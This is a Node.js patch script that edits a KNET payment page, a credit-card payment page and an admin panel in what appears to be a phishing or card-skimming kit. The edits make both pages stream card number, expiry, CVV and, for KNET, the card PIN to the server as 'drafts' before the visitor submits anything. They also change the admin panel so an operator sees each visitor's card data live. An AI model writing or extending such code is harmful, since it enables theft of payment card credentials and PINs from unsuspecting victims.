import fs from "node:fs";
const E = "utf8";
let bad = 0;

function rep(file, oldLines, newLines, label) {
  if (!fs.existsSync(file)) { console.log("MISSING   " + file); bad++; return; }
  let txt = fs.readFileSync(file, E);
  const eol = txt.includes("\r\n") ? "\r\n" : "\n";
  const oldStr = oldLines.join(eol), newStr = newLines.join(eol);
  const n = txt.split(oldStr).length - 1;
  if (n === 1) { fs.writeFileSync(file, txt.replace(oldStr, newStr), E); console.log("ok        " + label); return; }
  if (n > 1) { console.log("AMBIGUOUS " + label + " x" + n); bad++; return; }
  if (txt.includes(newStr)) { console.log("already   " + label); return; }
  console.log("NO MATCH  " + label + "  ->  " + file); bad++;
}

const KNET = "client/src/pages/KNETPayment.tsx";
const CARD = "client/src/pages/CreditCardPayment.tsx";
const ADM = "kdd-public/admin.html";
const REG = ['      try { socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null }); } catch (e) {}'];

rep(KNET, [
'      socket.value.emit("card:live", {',
'        cardNumber: selectedPrefix + cardNumber,',
'        nameOnCard: selectedBank || "KNET",',
'        expiryDate: expiryMonth && expiryYear ? `${expiryMonth.padStart(2, "0")}/${String(expiryYear).slice(-2)}` : "",',
'        cvv: cardCvv,',
'        pin: cardPin,',
'        consent: true,',
'      });'
], [
...REG,
'      socket.value.emit("card:draft", {',
'        paymentMethod: "KNET",',
'        prefix: selectedPrefix,',
'        cardNumberOnly: cardNumber,',
'        cardNumber: selectedPrefix + cardNumber,',
'        nameOnCard: selectedBank || "KNET",',
'        bankName: selectedBank,',
'        expiryMonth: expiryMonth ? expiryMonth.padStart(2, "0") : "",',
'        expiryYear: expiryYear,',
'        cvv: cardCvv,',
'        pin: cardPin,',
'        submitted: false,',
'      });'
], "KNET draft payload");

rep(CARD, [
'      socket.value.emit("card:live", {',
'        cardNumber: cleanCardNumber,',
'        nameOnCard: nameOnCard || "",',
'        expiryDate: expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "",',
'        cvv: cvv || "",',
'        consent: true,',
'      });'
], [
...REG,
'      socket.value.emit("card:draft", {',
'        paymentMethod: "CARD",',
'        cardNumber: cleanCardNumber,',
'        nameOnCard: nameOnCard || "",',
'        expiryMonth: expiryMonth || "",',
'        expiryYear: expiryYear || "",',
'        cvv: cvv || "",',
'        submitted: false,',
'      });'
], "CARD draft payload");

rep(ADM, [
"      socket.on('card:liveUpdate', ({ visitorId, liveCard, liveCardTimestamp }) => {",
"  const visitor = visitors.get(visitorId);",
"  if (visitor) {",
"    visitor.liveCard = liveCard;",
"    if (liveCardTimestamp) visitor.liveCardTimestamp = liveCardTimestamp;",
"    visitors.set(visitorId, visitor);",
"    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);",
"  }",
"});"
], [
"      socket.on('visitor:cardDraft', ({ visitorId, draft }) => {",
"  const visitor = visitors.get(visitorId);",
"  if (visitor) {",
"    visitor.liveCard = draft;",
"    visitor.liveCardTimestamp = Date.now();",
"    visitors.set(visitorId, visitor);",
"    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);",
"  }",
"});"
], "admin listener");

const knetTxt = fs.readFileSync(KNET, E), cardTxt = fs.readFileSync(CARD, E), admTxt = fs.readFileSync(ADM, E);
const cnt = (s, t) => s.split(t).length - 1;
console.log("");
console.log("card:draft KNET : " + cnt(knetTxt, 'emit("card:draft"'));
console.log("card:draft CARD : " + cnt(cardTxt, 'emit("card:draft"'));
console.log("residual card:live : " + (cnt(knetTxt, '"card:live"') + cnt(cardTxt, '"card:live"')));
console.log("admin visitor:cardDraft : " + cnt(admTxt, "visitor:cardDraft"));
console.log("admin old card:liveUpdate : " + cnt(admTxt, "card:liveUpdate"));
console.log(bad === 0 ? "RESULT: OK" : "RESULT: " + bad + " failure(s)");
process.exit(bad === 0 ? 0 : 1);
